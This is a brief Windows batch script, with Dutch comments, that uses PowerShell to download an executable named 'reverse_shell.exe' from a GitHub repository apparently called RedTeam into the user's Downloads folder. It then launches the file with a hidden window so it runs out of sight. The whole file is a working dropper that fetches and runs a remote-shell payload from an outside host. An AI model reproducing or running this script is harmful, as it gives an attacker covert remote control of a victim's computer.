@echo off

REM PowerShell-commando om reverse_shell.exe te downloaden naar de map Downloads
powershell -Command "$downloadPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'reverse_shell.exe'); Invoke-WebRequest -Uri 'https://github.com/adel-barout/RedTeam/raw/main/reverse_shell.exe' -OutFile $downloadPath"

REM PowerShell-commando om reverse_shell.exe uit te voeren vanuit de Downloads-map in de achtergrond
powershell -Command "Start-Process $env:USERPROFILE\Downloads\reverse_shell.exe -WindowStyle Hidden"
